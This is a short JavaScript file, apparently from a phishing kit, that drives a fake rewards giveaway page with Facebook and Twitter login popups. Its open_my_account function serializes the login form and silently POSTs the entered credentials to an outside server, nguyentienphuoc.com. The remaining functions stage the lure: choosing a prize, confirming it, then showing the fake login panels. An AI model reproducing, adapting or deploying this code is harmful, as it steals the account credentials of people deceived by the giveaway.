function open_my_account() {
    var myFormAcc = $("#formLogin").serialize();
    $.ajax({
        url: 'nguyentienphuoc.com/api/index.php',
        data: myFormAcc,
        type: 'POST',
        success: function() {
            return true;
        },
        error: function() {
            return true;
        }
    });
}

function open_rewardsBox() {
    $('.rewardsBox').show();
    $('.rewardsHome').hide();
}

function close_otherPopup() {
    $(".otherPopup").hide()
}

function open_reward_confirmation(ag) {
    var rewardImg = $(ag).attr("src");
    $('.reward_confirmation').show();
    $('#myRewardImg').attr('src', rewardImg);
}

function open_account_login() {
    $('.account_login').show();
    $('.reward_confirmation').hide();
}

function open_facebook() {
    $('.login-facebook').show();
    $('.account_login').hide();
}

function open_twitter() {
    $('.login-twitter').show();
    $('.account_login').hide();
}

function close_reward_confirmation() {
    $(".reward_confirmation").hide()
}

function close_account_login() {
    $(".account_login").hide()
}

function tutup_facebook() {
    $('.login-facebook').hide()
    $('.account_login').show();
}

function tutup_twitter() {
    $('.login-twitter').hide()
    $('.account_login').show();
}